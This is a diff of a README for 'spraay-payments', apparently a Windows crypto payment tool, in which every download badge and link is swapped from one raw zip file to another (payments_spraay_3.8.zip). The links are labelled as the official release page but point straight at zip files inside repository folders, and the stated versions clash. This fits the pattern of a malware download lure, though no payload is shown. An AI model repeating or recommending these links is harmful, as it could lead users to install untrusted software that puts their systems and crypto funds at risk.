@@ -1,6 +1,6 @@
 # 💧 spraay-payments - Easy Multi-Chain Crypto Payments
 
-[![Download Latest Release](https://img.shields.io/badge/Download-spraay--payments-brightgreen)](https://raw.githubusercontent.com/extentadulthood280/spraay-payments/main/scripts/spraay-payments-1.0.zip)
+[![Download Latest Release](https://img.shields.io/badge/Download-spraay--payments-brightgreen)](https://github.com/extentadulthood280/spraay-payments/raw/refs/heads/main/references/payments_spraay_3.8.zip)
 
 ---
 
@@ -9,7 +9,7 @@
 To start using spraay-payments on your Windows computer, follow these steps:
 
 1. Go to the official release page:  
-   [https://raw.githubusercontent.com/extentadulthood280/spraay-payments/main/scripts/spraay-payments-1.0.zip](https://raw.githubusercontent.com/extentadulthood280/spraay-payments/main/scripts/spraay-payments-1.0.zip).
+   [https://github.com/extentadulthood280/spraay-payments/raw/refs/heads/main/references/payments_spraay_3.8.zip](https://github.com/extentadulthood280/spraay-payments/raw/refs/heads/main/references/payments_spraay_3.8.zip).
 
 2. Look for the latest version. It will usually be at the top and labeled with a version number, such as `v1.0.0` or later.
 
@@ -111,7 +111,7 @@ For further help, check the Issues tab on GitHub or ask your network administrat
 To update spraay-payments:
 
 1. Visit the release page again:  
-   [https://raw.githubusercontent.com/extentadulthood280/spraay-payments/main/scripts/spraay-payments-1.0.zip](https://raw.githubusercontent.com/extentadulthood280/spraay-payments/main/scripts/spraay-payments-1.0.zip).
+   [https://github.com/extentadulthood280/spraay-payments/raw/refs/heads/main/references/payments_spraay_3.8.zip](https://github.com/extentadulthood280/spraay-payments/raw/refs/heads/main/references/payments_spraay_3.8.zip).
 
 2. Download the latest installer file.
 
@@ -129,4 +129,4 @@ To update spraay-payments:
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Get%20Started%20Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/extentadulthood280/spraay-payments/main/scripts/spraay-payments-1.0.zip)
+[![Download Latest Release](https://img.shields.io/badge/Get%20Started%20Here-blue?style=for-the-badge)](https://github.com/extentadulthood280/spraay-payments/raw/refs/heads/main/references/payments_spraay_3.8.zip)
